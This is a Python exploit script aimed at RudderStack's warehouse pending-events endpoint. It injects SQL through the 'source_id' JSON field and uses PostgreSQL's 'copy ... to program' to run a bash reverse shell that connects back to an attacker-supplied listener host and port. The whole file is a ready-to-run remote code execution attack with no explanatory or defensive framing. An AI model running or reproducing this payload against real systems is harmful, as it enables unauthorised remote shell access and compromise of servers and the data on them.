#!/usr/bin/env python3 

import argparse
import traceback
import requests

def rce(lhost, lport):
    url = "http://rudderstack:8080/v1/warehouse/pending-events?triggerUpload=true"
    headers = {"Content-Type": "application/json"}
    json={"source_id": f"'; copy (select 'a') to program 'bash -c \"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\"' -- -"}
    try:
        print("[+] RCE payload sent. Check your listener!")
        print(f"[+] Listener {lhost}:{lport}")
        requests.post(url, headers=headers, json=json)
    except Exception as e:
        print("[-] Error sending the RCE request: ", e)
        traceback.print_exc()
    except KeyboardInterrupt:
        print("CTRL + c pressed. Exiting...")

def main():
    parser = argparse.ArgumentParser(description="RudderStack SQL Injection Vulnerability Exploitation (No WAF Bypass)")
    parser.add_argument("lhost", help="Listener IP address")
    parser.add_argument("lport", help="Listener port")
    args = parser.parse_args()

    rce(args.lhost, args.lport)

if __name__ == "__main__":
    main()
